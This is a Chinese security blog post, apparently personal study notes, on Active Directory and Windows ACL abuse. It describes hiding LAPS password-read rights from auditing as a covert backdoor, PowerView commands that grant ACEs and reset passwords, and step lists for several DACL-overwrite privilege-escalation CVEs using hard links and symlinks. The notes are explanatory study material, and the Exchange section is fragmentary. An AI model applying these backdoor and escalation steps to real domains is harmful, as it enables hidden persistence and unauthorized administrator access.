+<h3 id="关于LAPS的隐藏后门"><a href="#关于LAPS的隐藏后门" class="headerlink" title="关于LAPS的隐藏后门"></a>关于LAPS的隐藏后门</h3><p>LADS的全称是Local Administrator Password Solution，主要作用是将域内主机的本地管理员密码存储在LDAP中，作为计算机账户的一个机密属性，配合GPO实现自动定期修改密码，设置密码长度、强度等。LAPS通过首先将Active Directory架构扩展为包括两个新字段ms-MCS-AdmPwd（密码本身）和  ms-MCS-AdmPwdExpirationTime（密码过期时）来完成其方法。</p>
+<p>具体的配置和如何查询明文密码可以参考：<a href="http://drops.xmd5.com/static/drops/tips-10496.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-10496.html</a></p>
+<p>此时的环境：一个配置了LAPS的testwin7主机（属于testou）、一个域中的普通的测试账号zhangs</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578678284568.png" alt="1578678284568"></p>
+<p>此时通过命令查看testwin7主机的本地administrator密码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-AdmPwdPassword –ComputerName testwin7</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578677870018.png" alt="1578677870018"></p>
+<p>在zhangs登录的主机上使用LAPS UI尝试获取testwin7的本地密码没有成功：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578677973824.png" alt="1578677973824"></p>
+<p>然后在testou中添加zhangs的读取密码的权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-AdmPwdReadPasswordPermission -Identity testou -AllowedPrincipals zhangs</span><br></pre></td></tr></table></figure>
+
+<p>此时再在zhangs主机上尝试获取testwin7密码:</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578678413373.png" alt="1578678413373"></p>
+<p>能够成功获取，但是此时的zhangs的权限是能够被观察到的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Find-AdmPwdExtendedRights -Identity testou -IncludeComputers | fl</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578678476882.png" alt="1578678476882"></p>
+<p>解决方法是在testou中新建一个msImaging-PSPs类型的对象testmspsps，此类容器的权限不能被Find-AdmPwdExtendedRights所遍历，同时将testwin7移动到testmspsps中，然后在testmspsps的ACL中设置受托人为zhangs的完全控制权限：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578678792201.png" alt="1578678792201"></p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578679073254.png" alt="1578679073254"></p>
+<p>此时在zhangs中就可以获取testwin7的密码，并且不会被Find-AdmPwdExtendedRights这个命令遍历到：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578679133053.png" alt="1578679133053"></p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578679172037.png" alt="1578679172037"></p>
+<p>这种方式的缺点在于需要移动域内主机所属的组。</p>
+<h3 id="Exchange上的利用"><a href="#Exchange上的利用" class="headerlink" title="Exchange上的利用"></a>Exchange上的利用</h3><p>zhangs   badguy<br>xxm   patsy</p>
+<p>有权限的话，在xxm写一条受托人为zhangs的完全控制权限的ACE：<br>Add-DomainObjectAcl -TargetIdentity xxm -PrincipalIdentity zhangs -Rights All</p>
+<p>然后添加ACE到默认域控制器的GPO中<br>$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity xxm -Right WriteDacl<br>$TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACE)<br>$TargetObject.PsBase.CommitChanges()</p>
+<p>在zhangs的权限下重置xxm的用户密码：<br>$UserPassword = ConvertTo-SecureString ‘Password123!’ -AsPlainText -Force</p>
+<h2 id="本地ACL相关漏洞"><a href="#本地ACL相关漏洞" class="headerlink" title="本地ACL相关漏洞"></a>本地ACL相关漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-8440</span><br><span class="line">https:&#x2F;&#x2F;cert.360.cn&#x2F;report&#x2F;detail?id&#x3D;44669690fc7a8daab42472cebd8cfb88</span><br><span class="line">CVE-2019-1064</span><br><span class="line">https:&#x2F;&#x2F;www.rythmstick.net&#x2F;posts&#x2F;cve-2019-1064&#x2F;</span><br><span class="line">CVE-2019-1069</span><br><span class="line">https:&#x2F;&#x2F;blog.0patch.com&#x2F;2019&#x2F;06&#x2F;another-task-scheduler-0day-another.html</span><br><span class="line">https:&#x2F;&#x2F;www.thezdi.com&#x2F;blog&#x2F;2019&#x2F;6&#x2F;11&#x2F;exploiting-the-windows-task-scheduler-through-cve-2019-1069</span><br><span class="line">CVE-2019-3582</span><br><span class="line">https:&#x2F;&#x2F;offsec.almond.consulting&#x2F;mcafee-endpoint-security-arbitrary-file-write-eop.html</span><br><span class="line">CVE-2019-6177</span><br><span class="line">https:&#x2F;&#x2F;www.secpulse.com&#x2F;archives&#x2F;111592.html</span><br><span class="line">CVE-2019-0841</span><br><span class="line">https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1552085</span><br><span class="line">CVE-2019-0863</span><br><span class="line">http:&#x2F;&#x2F;www.yidianzixun.com&#x2F;article&#x2F;0MecAAAd</span><br><span class="line">https:&#x2F;&#x2F;unit42.paloaltonetworks.com&#x2F;tale-of-a-windows-error-reporting-zero-day-cve-2019-0863&#x2F;</span><br><span class="line">GeekPwn 2016 Windows 服务提权漏洞的分析</span><br><span class="line">https:&#x2F;&#x2F;rekken.github.io&#x2F;2017&#x2F;07&#x2F;23&#x2F;Analysis-and-Exploitation-of-GeekPwn-2016-Windows-Services-EoP-Vulnerability&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Windows符号链接"><a href="#Windows符号链接" class="headerlink" title="Windows符号链接"></a>Windows符号链接</h3><p>可以从低特权用户访问三种类型的符号链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对象管理器符号链接（Object Manager Symbolic Links）</span><br><span class="line">注册表项符号链接（Registry Key Symbolic Links）</span><br><span class="line">NTFS挂载点（NTFS Mount Points）</span><br></pre></td></tr></table></figure>
+
+<p>实际上，还有第四种类型，即NTFS符号链接（NTFS Symbolic Links），但是只有在您是管理员的情况下，才可以创建此类型，而对于特权提升却很少使用它们。</p>
+<h3 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h3><p>mklink是Windows上自带的cmd命令，可以创建一个文件的链接文件。<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mklink" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mklink</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mklink testmd.txt a.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/image-20200408180315981.png" alt="image-20200408180315981"></p>
+<p>查看testmd.txt文件显示的是a.txt中的内容：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/image-20200408180435105.png" alt="image-20200408180435105"></p>
+<p>同时被链接的对象可以是UNC路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mklink unc.txt \\win2012\c$\log.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/image-20200408180505461.png" alt="image-20200408180505461"></p>
+<h3 id="CVE-2014-6350"><a href="#CVE-2014-6350" class="headerlink" title="CVE-2014-6350"></a>CVE-2014-6350</h3><p>[<a href="https://wooyun.js.org/drops/Internet%20Explorer%20EPM%E6%B2%99%E7%9B%92%E8%B7%B3%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90%EF%BC%88CVE-2014-6350%EF%BC%89.html]" target="_blank" rel="noopener">https://wooyun.js.org/drops/Internet%20Explorer%20EPM%E6%B2%99%E7%9B%92%E8%B7%B3%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90%EF%BC%88CVE-2014-6350%EF%BC%89.html]</a>(<a href="https://wooyun.js.org/drops/Internet" target="_blank" rel="noopener">https://wooyun.js.org/drops/Internet</a> Explorer EPM沙盒跳出漏洞的分析（CVE-2014-6350）.html)</p>
+<h3 id="cve-2018-8440"><a href="#cve-2018-8440" class="headerlink" title="cve-2018-8440"></a>cve-2018-8440</h3><h4 id="简单原理："><a href="#简单原理：" class="headerlink" title="简单原理："></a>简单原理：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SchRpcSetSecurity函数在win10中会检测C:\Windows\Tasks目录下是否存在后缀为.job的文件，如果存在则会写入DACL(写入的权限为高权限)数据。如果将job文件硬链接到特定的dll那么特定的dll就会被写入DACL数据，本来普通用户对特定的dll只具有读权限，这样就具有了写权限，接下来向dll写入漏洞利用代码并启动相应的程序就可以提权了。</span><br></pre></td></tr></table></figure>
+
+<p>分析文章：<a href="https://zhuanlan.zhihu.com/p/55020544" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/55020544</a></p>
+<p><a href="https://cert.360.cn/report/detail?id=44669690fc7a8daab42472cebd8cfb88" target="_blank" rel="noopener">https://cert.360.cn/report/detail?id=44669690fc7a8daab42472cebd8cfb88</a></p>
+<p><strong>什么是ALPC?</strong><br>ALPC（高级本地过程调用）是一种内部的，未记录的进程间通信工具，由Microsoft Windows NT内核提供，用于在同一台计算机上的进程之间进行轻量级的通信。</p>
+<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 将job后缀的文件硬链接到特定dll</span><br><span class="line">2 使用SchRpcSetSecurity函数来设置DACL</span><br><span class="line">3 调用SchRpcSetSecurity(“hardlink”,“sddl_string”,0)</span><br></pre></td></tr></table></figure>
+
+<p>POC：</p>
+<p><a href="https://github.com/sourceincite/CVE-2018-8440" target="_blank" rel="noopener">https://github.com/sourceincite/CVE-2018-8440</a></p>
+<p><a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2018-8440" target="_blank" rel="noopener">https://vulmon.com/vulnerabilitydetails?qid=CVE-2018-8440</a></p>
+<h3 id="CVE-2019-1064-AppXSVC"><a href="#CVE-2019-1064-AppXSVC" class="headerlink" title="CVE-2019-1064 AppXSVC"></a>CVE-2019-1064 AppXSVC</h3><p>原理：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">当用户的AppData&#x2F;Local&#x2F;Packages下的任何文件夹结构被删除时，文件夹结构将由位于其下的二进制文件重新创建</span><br><span class="line">C:&#x2F;WINDOWS&#x2F;SystemApps&#x2F;</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">删除了</span><br><span class="line">C:&#x2F;users&#x2F;rythmstick&#x2F;AppData&#x2F;Local&#x2F;Packages&#x2F;Microsoft.Windows.Cortana_cw5n1h2txyewy</span><br><span class="line"></span><br><span class="line">将通过调用重新创建文件夹结构来重新创建</span><br><span class="line">C:&#x2F;Windows&#x2F;SystemApps&#x2F;Microsoft.Windows.Cortana_cw5n1h2txyewy&#x2F;SearchIU.exe -ServerName:CortanaUI.AppXa....epj.mca</span><br><span class="line"></span><br><span class="line">在更新本地文件的DACL的时候使用的是NT AUTHORITY\SYSTEM权限</span><br><span class="line"></span><br><span class="line">如果在删除文件之后，更新本地文件的DACL之前将一个硬链接放入此文件夹，那么就可以通过NT AUTHORITY\SYSTEM权限来覆盖任何文件的DACL</span><br></pre></td></tr></table></figure>
+
+<p>POC：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;RythmStick&#x2F;CVE-2019-1064</span><br></pre></td></tr></table></figure>
+
+<h3 id="cve-2019-1069计划任务"><a href="#cve-2019-1069计划任务" class="headerlink" title="cve-2019-1069计划任务"></a>cve-2019-1069计划任务</h3><p>原理：</p>
+<p>Task Scheduler以本地计算机定义的最大特权运行，即NT AUTHORITY \ SYSTEM。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">任务计划程序将任务作为文件存储在两个单独的位置。第一个C:\Windows\Tasks是旧位置。用于所有新任务的第二个位置是C:\Windows\System32\Tasks。如果RPC客户端使用该服务来修改以的旧位置表示的任务，则C:\Windows\Tasks当该服务保存所做的修改时，该任务将被迁移到的首选位置C:\Windows\System32\Tasks。</span><br><span class="line"></span><br><span class="line">将任务文件保存到首选位置时，服务将在文件上设置安全信息，以授予所有权和对任务所有者的完全控制权。至关重要的是，任务计划程序服务使用其自己的高度特权的SYSTEM令牌执行此操作。</span><br></pre></td></tr></table></figure>
+
+<p>漏洞分析：</p>
+<p><a href="https://www.thezdi.com/blog/2019/6/11/exploiting-the-windows-task-scheduler-through-cve-2019-1069" target="_blank" rel="noopener">https://www.thezdi.com/blog/2019/6/11/exploiting-the-windows-task-scheduler-through-cve-2019-1069</a></p>
+<p>攻击步骤：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.创建一个新任务。</span><br><span class="line">2.用指向任意目标文件的硬链接替换首选文件夹中的文件。</span><br><span class="line">3.手动将具有相同名称的新任务放入旧文件夹。</span><br><span class="line">4.使用任务计划程序RPC界面将任务迁移到首选文件夹。Task Scheduler服务将更新首选文件夹中文件的安全性信息，将所有权和完全控制权授予攻击者。由于此文件实际上是硬链接，因此此安全信息将应用于目标文件。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="CVE-2019-6177-Lenovo"><a href="#CVE-2019-6177-Lenovo" class="headerlink" title="CVE-2019-6177 Lenovo"></a>CVE-2019-6177 Lenovo</h3><p>同样是一个DACL复写漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">联想的 LSC安装后，会在计划任务中的\Lenovo\Lenovo Solution Center Launcher加一个任务， 该任务会在login事件后10分钟运行LSC.Services.UpdateStatusService.exe二进制文件。</span><br><span class="line"></span><br><span class="line">二进制文件会覆写C:\ProgramData\Lenovo\LSC\log\目录的所有文件的DACL，给认证用户组（Authenticated Users）中的所有成员完全访问权限。所以Authenticated Users中的所有成员都会有这些文件的访问权限。</span><br><span class="line"></span><br><span class="line">使用硬链接复写以System权限运行的进程加载的DLL的DACL，然后用shellcode复写DLL，并触发进程。</span><br></pre></td></tr></table></figure>
+
+<h3 id="CVE-2019-0863-WER"><a href="#CVE-2019-0863-WER" class="headerlink" title="CVE-2019-0863 WER"></a>CVE-2019-0863 WER</h3><p>Windows错误报告（WER，Windows error report）</p>
+<p>原理：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wermger.exe逐一解析报告目录中的所有文件，将这些文件提交给微软</span><br><span class="line">当wermger.exe检测到损坏的Report.werINI文件，就会删除该文件。而wermger.exe首先会修改该文件的DACL属性，再删除该文件</span><br><span class="line">wermger.exe在读取文件DACL属性以及添加删除权限之间存在多个一个时间窗口，攻击者利用的正是这个时间窗口。如果攻击者创建此类文件与系统上其他任意文件的一个链接，那么在读取DACL之后，wermgr.exe会错误地修改其他文件的DACL。</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xz.aliyun.com/t/5571" target="_blank" rel="noopener">https://xz.aliyun.com/t/5571</a></p>
+<h3 id="cve-2019-0841"><a href="#cve-2019-0841" class="headerlink" title="cve-2019-0841"></a>cve-2019-0841</h3><p><a href="http://blog.nsfocus.net/cve-2019-0841-dacl/" target="_blank" rel="noopener">http://blog.nsfocus.net/cve-2019-0841-dacl/</a></p>
+<h3 id="CVE-2020-0668"><a href="#CVE-2020-0668" class="headerlink" title="CVE-2020-0668"></a>CVE-2020-0668</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SOFTWARE\Microsoft\Tracing 注册表项任意用户（Everyone）可写可读，Tracing注册表项主要用于Windows服务跟踪调试，调试过程中会以SYSTEM权限产生一个日志文件：</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/image-20200413214228387.png" alt="image-20200413214228387"></p>
+<p>其中：<code>FileDirectory</code> 项主要用于设置日志产生的目录，经过作者分析发现，日志文件名不可控、日志内容更不可控，其次，当日志文件大小超过了<code>MaxFileSize</code>时，会将文件重命名到当前目录，扩展名改为OLD。</p>
+<p>利用流程：</p>
+<p>1、创建（或复制）一个大小大于0x8000（32,768）字节的文件。<br>2、创建一个新目录（C:\EXPLOIT\mountpoint\例如）并将其设置为的挂载点\RPC Control。</p>
+<p>3、创建以下符号链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\RPC Control\RASTAPI.LOG -&gt; \??\C:\EXPLOIT\FakeDll.dll (owner &#x3D; current user)</span><br><span class="line">\RPC Control\RASTAPI.OLD -&gt; \??\C:\Windows\System32\WindowsCoreDeviceInfo.dll</span><br></pre></td></tr></table></figure>
+
+<p>4、在注册表中配置以下值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FileDirectory &#x3D; C:\EXPLOIT\mountpoint</span><br><span class="line">MaxFileSize &#x3D; 0x8000 (32,768‬ bytes)</span><br><span class="line">EnableFileTracing &#x3D; 1</span><br></pre></td></tr></table></figure>
+
+<p>5、使用RasDialWindows API中的函数触发与RASTAPI相关的事件<br>6、触发Update Session Orchestrator服务以NT AUTHORITY\SYSTEM权限加载DLL </p>
+<h3 id="CVE-2020-1317：Windows组策略中的漏洞"><a href="#CVE-2020-1317：Windows组策略中的漏洞" class="headerlink" title="CVE-2020-1317：Windows组策略中的漏洞"></a>CVE-2020-1317：Windows组策略中的漏洞</h3><p><a href="https://www.anquanke.com/post/id/208437#h2-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/208437#h2-4</a></p>
+<h3 id="GeekPwn"><a href="#GeekPwn" class="headerlink" title="GeekPwn"></a>GeekPwn</h3><p><a href="https://rekken.github.io/2017/07/23/Analysis-and-Exploitation-of-GeekPwn-2016-Windows-Services-EoP-Vulnerability/" target="_blank" rel="noopener">https://rekken.github.io/2017/07/23/Analysis-and-Exploitation-of-GeekPwn-2016-Windows-Services-EoP-Vulnerability/</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/12-18-ATT&CK_Credential%20Access/">ATT&CK_Credential Access</a>
+            
+            
+        </section>
+	
+		<section id="comments" class="comments">
+		  <style>
+			.comments{margin:30px;padding:10px;background:#fff}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+		  </style>
+		  <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: 'ehQ0k7G3fcpwmkyxhG8U6DzL-gzGzoHsz',
+      app_key: 'AwwXGgbdqswiimAY0qJYhtRa',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+		</section>
+	
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© SeikoSrp | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
